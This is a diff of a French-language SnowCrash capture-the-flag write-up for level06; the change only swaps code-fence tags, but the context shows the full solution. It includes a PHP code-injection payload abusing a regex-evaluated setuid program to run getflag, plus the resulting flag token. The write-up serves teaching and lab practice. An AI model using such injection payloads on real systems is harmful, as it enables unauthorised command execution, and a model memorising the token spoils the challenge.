@@ -4,7 +4,7 @@
 
 ## ls -l
 
-```zsh
+```sh
 level06@SnowCrash:~$ ls -l
 total 12
 -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
@@ -18,7 +18,7 @@ Dans le fichier level06, rws signifie lecture-écriture-exécution + setuid. Cel
 
 ## d'exécution level06
 
-```zsh
+```sh
 level06@SnowCrash:~$ ./level06
 PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
 ```
@@ -49,7 +49,7 @@ regex : (\[x (.*)\])
 </br></br>
 
 ## make file 
-```zsh
+```sh
 level06@SnowCrash:~$ mkdir /tmp/level06
 level06@SnowCrash:~$ echo '[x {${shell_exec(getflag)}}]' > /tmp/level06/flag06
 ```
@@ -57,7 +57,7 @@ level06@SnowCrash:~$ echo '[x {${shell_exec(getflag)}}]' > /tmp/level06/flag06
 </br></br>
 
 ## execute level06 with file flag06
-```zsh
+```sh
 level06@SnowCrash:~$ ./level06 /tmp/level06/flag06 
 PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
